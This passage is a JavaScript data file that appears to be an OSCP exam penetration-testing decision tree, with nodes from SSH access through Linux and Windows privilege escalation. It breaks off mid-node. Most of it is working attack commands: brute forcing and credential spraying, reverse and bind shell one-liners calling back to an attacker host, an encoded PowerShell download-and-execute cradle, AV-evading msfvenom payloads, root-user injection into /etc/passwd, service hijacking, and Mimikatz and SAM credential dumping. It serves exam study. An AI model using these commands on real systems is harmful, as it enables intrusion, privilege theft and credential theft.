      { label: "Anonymous access — found interesting files", next: "smb_loot" },
      { label: "FTP writable + webroot accessible = shell", next: "reverse_shell" },
      { label: "Need creds", next: "bruteforce" },
    ],
  },

  // ══════════════════════════════════════════
  //  SSH
  // ══════════════════════════════════════════
  ssh_only: {
    phase: "SSH",
    title: "SSH Only Exposed",
    body: "SSH alone is rarely the initial attack vector. You need creds or a key from somewhere. Check non-standard web ports — something else is almost always running.",
    cmd: `# Check non-standard ports
nmap -p 8000,8080,8443,8888,9000,9090,3000,5000 $IP

# SSH version / algo audit
ssh-audit $IP

# Banner grab
nc -nv $IP 22

# Username enum (if older OpenSSH)
ssh-user-enum.py -U /opt/SecLists/Usernames/Names/names.txt -t $IP`,
    warn: "Brute forcing SSH without a targeted username list is almost never the path.",
    choices: [
      { label: "Found web on non-standard port", next: "web_enum" },
      { label: "Got creds from elsewhere — SSH in", next: "linux_post_exploit" },
      { label: "Got SSH key", next: "ssh_key" },
    ],
  },

  ssh_key: {
    phase: "SSH",
    title: "SSH Key Found",
    body: "Always check permissions first — SSH will refuse a key that's world-readable. If passphrase-protected, crack it with ssh2john.",
    cmd: `chmod 600 id_rsa
ssh -i id_rsa user@$IP
ssh -i id_rsa -o StrictHostKeyChecking=no user@$IP

# Crack passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt

# Try all users from /etc/passwd
for user in $(cat users.txt); do
  ssh -i id_rsa $user@$IP -o StrictHostKeyChecking=no 2>/dev/null && echo "HIT: $user"
done`,
    warn: null,
    choices: [
      { label: "SSH'd in — Linux privesc", next: "linux_post_exploit" },
      { label: "Cracking passphrase", next: "hashcrack" },
    ],
  },

  // ══════════════════════════════════════════
  //  OTHER SERVICES
  // ══════════════════════════════════════════
  other_services: {
    phase: "RECON",
    title: "Other Services",
    body: "SNMP leaks configs and community strings. DNS zone transfers can reveal the whole network map. LDAP and RPC enumerate users without authentication.",
    cmd: `# SNMP — community string brute + walk
onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt $IP
snmpwalk -c public -v1 $IP
snmp-check $IP

# DNS zone transfer
dig axfr @$IP domain.com
host -l domain.com $IP
dnsrecon -d domain.com -t axfr

# LDAP anonymous bind
ldapsearch -x -h $IP -b "dc=domain,dc=com"
ldapsearch -x -h $IP -b "" -s base namingContexts

# RPC null session
rpcclient -U "" $IP
> enumdomusers
> enumdomgroups
> queryuser <RID>

# NFS shares
showmount -e $IP`,
    warn: null,
    choices: [
      { label: "Got usernames from SNMP/LDAP/RPC", next: "bruteforce" },
      { label: "SMTP open — enumerate users", next: "smtp_enum" },
      { label: "DNS — try zone transfer", next: "dns_enum" },
      { label: "Domain info found — pivot to AD", next: "ad_start" },
      { label: "NFS share found — mount it", next: "nfs_enum" },
    ],
  },

  // ══════════════════════════════════════════
  //  BRUTE FORCE / CREDS
  // ══════════════════════════════════════════
  bruteforce: {
    phase: "CREDS",
    title: "Brute Force",
    body: "Build a targeted wordlist from the site with CeWL before throwing rockyou at everything. Username + password combos, default creds, and seasonal passwords are all common.",
    cmd: `# Build custom wordlist from target
cewl http://$IP -d 3 -m 5 -w custom.txt

# Hydra — SSH
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\
  ssh://$IP -t 4 -o hydra_ssh.txt

# Hydra — web form
hydra -l admin -P rockyou.txt \\
  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" -V

# Hydra — SMB
hydra -L users.txt -P rockyou.txt smb://$IP

# Hydra — FTP
hydra -L users.txt -P rockyou.txt ftp://$IP

# CME spray (check lockout policy first!)
crackmapexec smb $IP -u users.txt -p passwords.txt \\
  --continue-on-success`,
    warn: "Check lockout policy before spraying AD. Getting accounts locked will end your exam.",
    choices: [
      { label: "Got credentials!", next: "creds_found" },
      { label: "No luck — searchsploit service versions", next: "searchsploit_web" },
    ],
  },

  hashcrack: {
    phase: "CREDS",
    title: "Hash Cracking",
    body: "Identify hash type first — wrong module wastes time. Rules multiply your wordlist effectiveness massively.",
    cmd: `# Identify
hash-identifier <hash>
hashid <hash>
# Or: https://hashes.com/en/tools/hash_identifier

# Hashcat modules:
# MD5           = -m 0
# SHA1          = -m 100
# NTLM          = -m 1000
# NetNTLMv2     = -m 5600
# sha512crypt   = -m 1800   (Linux $6$)
# bcrypt        = -m 3200
# Kerberoast    = -m 13100
# AS-REP        = -m 18200

hashcat -m <module> hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m <module> hash.txt rockyou.txt \\
  -r /usr/share/hashcat/rules/best64.rule
hashcat -m <module> hash.txt rockyou.txt \\
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT --wordlist=rockyou.txt`,
    warn: null,
    choices: [
      { label: "Cracked — got plaintext password", next: "creds_found" },
      { label: "rockyou failed — try larger list or more rules", next: "hashcrack" },
    ],
  },

  creds_found: {
    phase: "CREDS",
    title: "Credentials Found",
    body: "Spray those creds on every service immediately. Password reuse is the most consistent win on OSCP. Same user, same password, different service.",
    cmd: `# Try everything
ssh user@$IP
evil-winrm -i $IP -u user -p 'password'
crackmapexec smb $IP -u user -p 'password'
crackmapexec winrm $IP -u user -p 'password'
smbclient //$IP/share -U user
ftp $IP   # try creds manually
mysql -u user -p'password' -h $IP

# Check all share access with creds
crackmapexec smb $IP -u user -p 'password' --shares
crackmapexec smb $IP -u user -p 'password' --users
crackmapexec smb $IP -u user -p 'password' --groups`,
    warn: null,
    choices: [
      { label: "SSH / shell access — Linux machine", next: "linux_post_exploit" },
      { label: "WinRM / RDP / SMB — Windows machine", next: "windows_post_exploit" },
      { label: "Web access only", next: "file_upload" },
      { label: "Spray these creds everywhere NOW", next: "cred_reuse" },
    ],
  },

  // ══════════════════════════════════════════
  //  SHELL & UPGRADE
  // ══════════════════════════════════════════
  reverse_shell: {
    phase: "SHELL",
    title: "Catch the Shell",
    body: "Listener first, then execute payload. Use 443 or 80 — egress filtering blocks high ports constantly. pwncat-cs auto-upgrades TTY. If the shell dies immediately, the issue is almost always the payload encoding or a filtered port.",
    cmd: `# ── LISTENERS ────────────────────────────
# pwncat-cs (best — auto TTY, file transfer built in)
pwncat-cs -lp $LPORT

# nc fallback
nc -nlvp $LPORT

# ── LINUX PAYLOADS ────────────────────────
# Bash (most reliable on Linux)
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
# URL encoded version (for web shells/curl):
bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python2 fallback
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP (web context)
php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# nc with -e (if available)
nc $LHOST $LPORT -e /bin/bash

# ── WINDOWS PAYLOADS ─────────────────────
# PowerShell one-liner
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"

# PowerShell encoded (bypass execution policy + logging)
# Generate: echo "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc [BASE64]

# msfvenom Windows stageless exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe
# Staged (smaller, needs handler)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o staged.exe

# msfvenom Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf

# Reference: https://www.revshells.com`,
    warn: "Shell dies immediately? Check: (1) port reachable from target — try 443/80, (2) AV killing binary — use encoded payload or AMSI bypass, (3) bash not available — try sh or python, (4) /bin/bash path wrong — try /bin/sh.",
    choices: [
      { label: "Shell caught — upgrade TTY", next: "shell_upgrade" },
      { label: "Shell dies immediately — troubleshoot", next: "shell_troubleshoot" },
      { label: "AV killing binary — bypass needed", next: "amsi_bypass" },
      { label: "Need meterpreter instead", next: "shell_meterpreter" },
    ],
  },

  shell_troubleshoot: {
    phase: "SHELL",
    title: "Shell Troubleshooting",
    body: "Shell not catching or dying immediately. Work through this systematically — the failure mode is almost always one of five things.",
    cmd: `# ── DIAGNOSTIC CHECKLIST ─────────────────

# 1. CAN THE TARGET REACH YOU?
# On target:
ping $LHOST -c 1       # ICMP allowed?
curl http://$LHOST      # HTTP out allowed?
# On attacker — watch tcpdump:
sudo tcpdump -i tun0 icmp
sudo tcpdump -i tun0 port $LPORT
# No ping = strict egress — try ports 80, 443, 53

# 2. WRONG PORT — FIREWALL FILTERING
# Retry with common allowed egress ports:
export LPORT=443   # HTTPS — almost never blocked
export LPORT=80    # HTTP
export LPORT=53    # DNS (use for tunnel not reverse shell normally)
nc -nlvp 443

# 3. SHELL BINARY NOT AVAILABLE
# Test what's on the target:
which bash sh python python3 perl ruby nc ncat
# Use whatever is present in the payload

# 4. ENCODING ISSUE (web delivery)
# Spaces and special chars break bash -c in web context
# Use base64 brace expansion — no spaces, no special chars:
echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' | base64 -w0
# Take the output (B64) and deliver as:
bash -c '{echo,B64OUTPUT}|{base64,-d}|{bash,-i}'

# PowerShell must use UTF-16LE encoding (not UTF-8):
echo 'IEX(New-Object Net.WebClient).DownloadString("http://$LHOST/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc B64OUTPUT

# Quick test — does base64 decode correctly?
echo "B64OUTPUT" | base64 -d  # verify payload before delivery

# 5. AV/AMSI BLOCKING BINARY
# Switch to: encoded PS, msfvenom with encoding, or manual AMSI bypass
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 \
  -f exe -e x64/xor_dynamic -i 5 -o shell_enc.exe

# 6. INTERACTIVE SHELL NEEDED (su, ssh)
# Some exploits give non-interactive — upgrade immediately
script /dev/null -c bash
python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    warn: "tcpdump is your ground truth. Run it on tun0 BEFORE executing payload. If you see the connection hit your interface but nc catches nothing: wrong port on listener. If nothing hits interface at all: egress filtered or wrong LHOST.",
    choices: [
      { label: "Fixed — shell caught", next: "shell_upgrade" },
      { label: "AV issue — bypass", next: "amsi_bypass" },
      { label: "Port filtered — try bind shell", next: "shell_bind" },
      { label: "Need different approach", next: "reverse_shell" },
    ],
  },

  shell_bind: {
    phase: "SHELL",
    title: "Bind Shell — Outbound Blocked",
    body: "Reverse shell requires outbound from target. If egress is fully filtered, flip it — bind shell listens ON the target, you connect TO it. Requires inbound access to target port.",
    cmd: `# ── BIND SHELL PAYLOADS ──────────────────
# nc on target (if -e available)
nc -nlvp 4444 -e /bin/bash

# nc without -e (use mkfifo)
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp 4444 > /tmp/f

# Python3 bind
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell bind (Windows)
powershell -nop -w hidden -c "$l=New-Object Net.Sockets.TcpListener('0.0.0.0',4444);$l.start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close();$l.Stop()"

# msfvenom bind (Linux)
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf

# msfvenom bind (Windows)
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe

# ── CONNECT FROM ATTACKER ─────────────────
nc $IP 4444`,
    warn: "Bind shells on OSCP exam machines are risky — another candidate could connect to your bind shell. Use a non-obvious port and close it when done. Reverse shells are always preferred.",
    choices: [
      { label: "Bind shell connected — upgrade TTY", next: "shell_upgrade" },
      { label: "Port blocked inbound too — web shell only", next: "iis_aspx" },
    ],
  },

  shell_meterpreter: {
    phase: "SHELL",
    title: "Meterpreter Shell",
    body: "Meterpreter is allowed on OSCP for 3 of 5 machines. Staged payload needs a handler. Stageless is simpler. Know the difference and know when to use each.",
    cmd: `# ── STAGED vs STAGELESS ──────────────────
# Staged (windows/x64/meterpreter/reverse_tcp):
#   Small stager connects back → downloads full payload
#   Needs: multi/handler running before execution
#   Smaller file, better for size-limited delivery

# Stageless (windows/x64/meterpreter_reverse_tcp):
#   Full payload in one binary
#   No handler dependency — nc won't work, need handler
#   Better AV detection but simpler setup

# ── GENERATE PAYLOAD ─────────────────────
# Staged Windows x64
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o met_staged.exe

# Stageless Windows x64
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f exe -o met_stageless.exe

# Linux staged
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT -f elf -o met_linux.elf

# ── HANDLER ──────────────────────────────
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
run -j   # run as job, catches multiple sessions

# ── USEFUL METERPRETER COMMANDS ──────────
sysinfo          # OS info
getuid           # current user
getsystem        # attempt privilege escalation
hashdump         # dump SAM hashes (needs SYSTEM)
upload shell.exe C:\\Windows\\Temp\\shell.exe
download C:\\Users\\Administrator\\Desktop\\proof.txt
shell            # drop to cmd.exe
migrate [PID]    # migrate to stable process
run post/multi/recon/local_exploit_suggester`,
    warn: "OSCP limits meterpreter to 3 of 5 exam machines. Use it strategically — not as your default. The exam tests whether you can operate without it. Save it for machines where it provides clear value.",
    choices: [
      { label: "Meterpreter session — post-exploit", next: "windows_post_exploit" },
      { label: "Meterpreter on Linux", next: "linux_post_exploit" },
      { label: "AV killed it — bypass first", next: "amsi_bypass" },
    ],
  },

  shell_upgrade: {
    phase: "SHELL",
    title: "Upgrade to Full TTY",
    body: "Do this immediately. A dumb shell will cost you time when Ctrl+C kills your process or tab completion fails.",
    cmd: `# Python TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or: python -c 'import pty; pty.spawn("/bin/bash")'
# or: /usr/bin/script -qc /bin/bash /dev/null

# Background + fix terminal
# Ctrl+Z
stty raw -echo; fg

# Fix sizing
export TERM=xterm-256color
stty rows 50 columns 200

# Environment cleanup
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
alias ls='ls -arlht --color=auto'`,
    warn: null,
    choices: [
      { label: "Linux shell — start privesc", next: "linux_post_exploit" },
      { label: "Windows shell — start privesc", next: "windows_post_exploit" },
      { label: "Shell keeps dying — stabilize it", next: "shell_troubleshoot" },
    ],
  },

  // ══════════════════════════════════════════
  //  LINUX PRIVESC
  // ══════════════════════════════════════════
  linux_post_exploit: {
    phase: "LINUX",
    title: "Linux — Initial Foothold",
    body: "Grab local.txt, understand who you are and what you have access to. Orient before you enumerate.",
    cmd: `id && whoami && hostname
uname -a && cat /etc/os-release
cat /etc/passwd   # all users
ip a              # network position

# Grab the flag
find / -name local.txt 2>/dev/null | xargs cat`,
    warn: null,
    choices: [
      { label: "New subnet visible in ip route — pivot!", next: "pivot_start" },
      { label: "Run LinPEAS (automated, thorough)", next: "linpeas" },
      { label: "sudo -l first (quickest win)", next: "sudo_check" },
    ],
  },

  linpeas: {
    phase: "LINUX",
    title: "LinPEAS",
    body: "Transfer and run. Tee to a file so you can grep it later. Prioritize RED findings first, then YELLOW. Don't just read — grep for keywords.",
    cmd: `# Transfer
python3 -m http.server 80   # on attacker

wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh | tee /tmp/lp_out.txt

# Grep results for key vectors
grep -i "sudo\\|suid\\|cron\\|writable\\|password\\|key\\|token" /tmp/lp_out.txt

# Also run pspy for process monitoring
wget http://$LHOST/pspy64 -O /tmp/pspy
chmod +x /tmp/pspy && /tmp/pspy`,
    warn: null,
    choices: [
      { label: "sudo rights found", next: "sudo_check" },
      { label: "SUID binary found", next: "suid_check" },
      { label: "Cron job found", next: "cron_check" },
      { label: "Interesting group membership (docker/lxd/disk)", next: "linux_privesc_extra" },
      { label: "Kernel looks vulnerable", next: "kernel_exploit" },
      { label: "Nothing obvious — hunt passwords in files", next: "linux_password_hunt" },
      { label: "Nothing obvious — deep manual enum", next: "linux_manual_enum" },
    ],
  },

  sudo_check: {
    phase: "LINUX",
    title: "Sudo Rights",
    body: "sudo -l is always the first manual check. Anything here goes straight to GTFOBins. LD_PRELOAD and env_keep abuse are often overlooked.",
    cmd: `sudo -l

# GTFOBins one-liners for common findings:
# sudo vim      → :!/bin/bash
# sudo nano     → Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0
# sudo find     → sudo find . -exec /bin/sh \\; -quit
# sudo python3  → sudo python3 -c 'import os; os.system("/bin/bash")'
# sudo less     → sudo less /etc/passwd → !/bin/bash
# sudo awk      → sudo awk 'BEGIN {system("/bin/bash")}'
# sudo env      → sudo env /bin/sh
# sudo tee      → echo "root2:$(openssl passwd -1 pass):0:0::/root:/bin/bash" | sudo tee -a /etc/passwd
# sudo cp       → copy /etc/sudoers, edit, copy back

# LD_PRELOAD abuse (if env_keep=LD_PRELOAD)
# Write shared lib that spawns shell, sudo <anything>`,
    warn: null,
    choices: [
      { label: "GTFOBins worked — ROOT!", next: "got_root_linux" },
      { label: "Nothing useful — check SUID", next: "suid_check" },
    ],
  },

  suid_check: {
    phase: "LINUX",
    title: "SUID Binaries",
    body: "Find every SUID binary and check each one on GTFOBins. Custom SUID binaries with path injection or buffer overflows are common OSCP vectors.",
    cmd: `find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Check each on https://gtfobins.github.io (SUID filter)

# Common GTFOBins SUID:
# find    → ./find . -exec /bin/sh -p \\; -quit
# bash    → ./bash -p
# vim     → ./vim -c ':py import os; os.execl("/bin/sh","sh","-p")'
# python  → ./python -c 'import os; os.execl("/bin/sh","sh","-p")'
# cp      → cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; /tmp/rootbash -p

# Custom SUID binary — check for path injection
strings /path/to/suid_binary | grep -v "/"   # unqualified commands?
ltrace /path/to/suid_binary                  # library calls
strace /path/to/suid_binary                  # syscalls`,
    warn: null,
    choices: [
      { label: "GTFOBins SUID exploit worked — ROOT!", next: "got_root_linux" },
      { label: "Custom binary — path hijack worked", next: "got_root_linux" },
      { label: "Nothing — check cron", next: "cron_check" },
    ],
  },

  cron_check: {
    phase: "LINUX",
    title: "Cron Jobs",
    body: "Scripts run by root on a schedule that you can write to are privesc gold. Use pspy to catch jobs that don't appear in crontab.",
    cmd: `cat /etc/crontab
ls -la /etc/cron*
crontab -l

# pspy — watch for root processes (no root needed)
/tmp/pspy64

# If you find a writable script called by root:
echo 'chmod +s /bin/bash' >> /path/to/script.sh
# Wait for execution, then:
/bin/bash -p

# Or add SUID to copy of bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/script.sh

# PATH injection in cron:
# If cron calls unqualified binary + you control PATH dir:
echo '#!/bin/bash' > /tmp/curl
echo 'chmod +s /bin/bash' >> /tmp/curl
chmod +x /tmp/curl
export PATH=/tmp:$PATH`,
    warn: null,
    choices: [
      { label: "Cron exploitation worked — ROOT!", next: "got_root_linux" },
      { label: "No writable cron targets — try capabilities", next: "linux_manual_enum" },
    ],
  },

  linux_manual_enum: {
    phase: "LINUX",
    title: "Deep Manual Enumeration",
    body: "LinPEAS missed something. Go manual on capabilities, NFS, writable files, interesting env vars, stored creds in configs.",
    cmd: `getcap -r / 2>/dev/null
# python3 cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

cat /etc/exports && showmount -e $IP

ls -la /etc/passwd
openssl passwd -1 -salt x pass123
echo 'r00t:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

find / -name "id_rsa" 2>/dev/null
cat ~/.bash_history
find / -name "*.conf" | xargs grep -i "password" 2>/dev/null
find / -mmin -10 -type f 2>/dev/null`,
    warn: null,
    choices: [
      { label: "Capabilities exploit worked — ROOT!", next: "got_root_linux" },
      { label: "NFS no_root_squash — SUID exploit", next: "got_root_linux" },
      { label: "Writable /etc/passwd — added root user", next: "got_root_linux" },
      { label: "Group membership (docker/lxd/disk)", next: "linux_privesc_extra" },
      { label: "Still nothing — kernel exploit", next: "kernel_exploit" },
    ],
  },

  kernel_exploit: {
    phase: "LINUX",
    title: "Kernel Exploit",
    body: "Last resort — kernel exploits can crash the machine. Compile carefully, test, have a revert plan. DirtyCow is classic but notoriously unstable.",
    cmd: `uname -r
cat /etc/os-release

searchsploit linux kernel $(uname -r | cut -d'-' -f1)
searchsploit linux privilege escalation

# Common exploits by kernel:
# DirtyCow     CVE-2016-5195   (2.6.22 – 4.8.3)
# overlayfs    CVE-2015-1328   (Ubuntu 12.04/14.04/15.10)
# Baron Samedit CVE-2021-3156  (sudo < 1.9.5p2)
# Dirty Pipe   CVE-2022-0847   (5.8 – 5.16.11)

# Always compile on same arch as target
gcc exploit.c -o exploit
./exploit`,
    warn: "Kernel exploits can destabilize the machine. Use as last resort. Have revert ready.",
    choices: [
      { label: "Kernel exploit worked — ROOT!", next: "got_root_linux" },
      { label: "Machine crashed — reverted and re-enumerate", next: "linux_post_exploit" },
    ],
  },

  got_root_linux: {
    phase: "LINUX",
    title: "ROOT — Linux",
    body: "You're root. Get the proof screenshot right: whoami + id + hostname + ip + cat proof.txt — all visible in one screenshot.",
    cmd: `id && whoami && hostname
ip a
cat /root/proof.txt

# Screenshot checklist:
# ✅ id showing uid=0(root)
# ✅ hostname visible
# ✅ IP visible (ip a or ifconfig)
# ✅ cat /root/proof.txt showing hash
# ✅ All in ONE screenshot`,
    warn: null,
    choices: [
      { label: "New subnet in ip route — pivot!", next: "pivot_start" },
      { label: "Back to start — next machine", next: "start" },
    ],
  },

  // ══════════════════════════════════════════
  //  WINDOWS PRIVESC
  // ══════════════════════════════════════════
  windows_post_exploit: {
    phase: "WINDOWS",
    title: "Windows — Initial Foothold",
    body: "Orient immediately. Who are you, what privileges do you have, what's the network look like. Token privileges are your first PrivEsc signal.",
    cmd: `whoami
whoami /all
whoami /priv
hostname
systeminfo
ipconfig /all

# Grab flag
type C:\\Users\\%username%\\Desktop\\local.txt
Get-ChildItem -Path "C:\\Users\\*" -Include "local.txt" -Recurse -EA SilentlyContinue | Get-Content`,
    warn: null,
    choices: [
      { label: "New subnet in ipconfig/route print — pivot!", next: "pivot_start" },
      { label: "Run WinPEAS (automated)", next: "winpeas" },
      { label: "Check token privs first (whoami /priv)", next: "token_privs" },
      { label: "PowerShell tools blocked — AMSI bypass first", next: "amsi_bypass" },
    ],
  },

  winpeas: {
    phase: "WINDOWS",
    title: "WinPEAS",
    body: "Transfer and run. Read RED findings first. Key areas: token privs, service vulns, stored creds, AlwaysInstallElevated, unquoted paths.",
    cmd: `# Transfer (python3 -m http.server 80 on attacker)
iwr http://$LHOST/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe
.\\wp.exe

# Also run PowerUp
iwr http://$LHOST/PowerUp.ps1 -OutFile C:\\Windows\\Temp\\pu.ps1
. .\\pu.ps1
Invoke-AllChecks

# Seatbelt for targeted checks
.\\Seatbelt.exe -group=all`,
    warn: null,
    choices: [
      { label: "SeImpersonatePrivilege found", next: "token_privs" },
      { label: "Unquoted service path found", next: "unquoted_service" },
      { label: "AlwaysInstallElevated found", next: "always_install_elevated" },
      { label: "Weak service permissions", next: "weak_service" },
      { label: "Stored creds / SAM", next: "windows_creds" },
      { label: "Nothing clear — scheduled tasks / manual", next: "windows_manual_enum" },
    ],
  },

  token_privs: {
    phase: "WINDOWS",
    title: "Token Impersonation (Potato)",
    body: "SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = instant SYSTEM on almost every Windows version. No Metasploit needed.",
    cmd: `whoami /priv
# Look for: SeImpersonatePrivilege
#           SeAssignPrimaryTokenPrivilege

# PrintSpoofer — Windows 10 / Server 2016-2019
iwr http://$LHOST/PrintSpoofer64.exe -OutFile C:\\Windows\\Temp\\ps.exe
.\\ps.exe -i -c cmd
.\\ps.exe -c "C:\\Windows\\Temp\\shell.exe"

# GodPotato — most universal (works on Server 2012-2022)
iwr http://$LHOST/GodPotato-NET4.exe -OutFile C:\\Windows\\Temp\\gp.exe
.\\gp.exe -cmd "cmd /c whoami"
.\\gp.exe -cmd "C:\\Windows\\Temp\\shell.exe"

# JuicyPotatoNG — if others fail
.\\JuicyPotatoNG.exe -t * -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami"`,
    warn: null,
    choices: [
      { label: "Potato worked — SYSTEM!", next: "got_root_windows" },
      { label: "No impersonate privs — check other vectors", next: "winpeas" },
    ],
  },

  unquoted_service: {
    phase: "WINDOWS",
    title: "Unquoted Service Path",
    body: "Service path with spaces and no quotes = Windows searches each path component. Drop your binary in the writable prefix location.",
    cmd: `# Find unquoted paths
wmic service get name,displayname,pathname,startmode \\
  | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"

# Manual check with sc
sc qc <ServiceName>

# Example vulnerable path:
# C:\\Program Files\\Some Folder\\service.exe
# Windows tries: C:\\Program.exe first (writable?)
#               C:\\Program Files\\Some.exe

# Generate payload (no MSF console needed — msfvenom is standalone)
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f exe -o Program.exe

# Transfer payload to writable location
# Start listener: nc -nlvp $LPORT
sc stop <ServiceName>
sc start <ServiceName>`,
    warn: null,
    choices: [
      { label: "Service restart — got SYSTEM shell", next: "got_root_windows" },
      { label: "Can't write to that path", next: "weak_service" },
    ],
  },

  weak_service: {
    phase: "WINDOWS",
    title: "Weak Service Permissions",
    body: "If you have WRITE_DAC or SERVICE_CHANGE_CONFIG on a service, you can redirect its binary path to your payload.",
    cmd: `# Find weak service perms
.\\accesschk.exe -uwcqv "Authenticated Users" * /accepteula
.\\accesschk.exe -uwcqv "Everyone" * /accepteula
.\\accesschk.exe -uwcqv "$USER" * /accepteula

# Modify binary path
sc config <ServiceName> binpath= "C:\\Windows\\Temp\\shell.exe"
sc config <ServiceName> binpath= "net localgroup administrators user /add"

sc stop <ServiceName>
sc start <ServiceName>

# Check service recovery options too
sc qfailure <ServiceName>`,
    warn: null,
    choices: [
      { label: "Got SYSTEM via modified service", next: "got_root_windows" },
    ],
  },

  always_install_elevated: {
    phase: "WINDOWS",
    title: "AlwaysInstallElevated",
    body: "Both registry keys at 1 = MSI files run as SYSTEM. Generate a malicious MSI with msfvenom (standalone, no console needed).",
    cmd: `# Verify BOTH keys (must be 1)
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Generate MSI payload (msfvenom standalone — no MSF console)
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=$LHOST LPORT=$LPORT -f msi -o shell.msi

# Transfer and execute
nc -nlvp $LPORT
msiexec /quiet /qn /i C:\\Windows\\Temp\\shell.msi`,
    warn: null,
    choices: [
      { label: "Got SYSTEM via MSI!", next: "got_root_windows" },
    ],
  },

  windows_creds: {
    phase: "WINDOWS",
    title: "Windows Credential Hunting",
    body: "Check everywhere: registry, cmdkey, SAM/SYSTEM, browser creds, config files. secretsdump and mimikatz are manual tools — no MSF needed.",
    cmd: `# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd

# Registry password hunt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# SAM + SYSTEM dump (must be admin)
reg save HKLM\\SAM C:\\Windows\\Temp\\sam
reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
# Transfer both, then on Kali:
impacket-secretsdump -sam sam -system system LOCAL

# Mimikatz (manual, no MSF)
.\\mimikatz.exe "privilege::debug" \\
  "token::elevate" \\
  "sekurlsa::logonpasswords" \\
  "lsadump::sam" \\
  "lsadump::cache" \\
  "exit"

# Interesting file locations
dir /s /b C:\\Users\\*.xml 2>nul
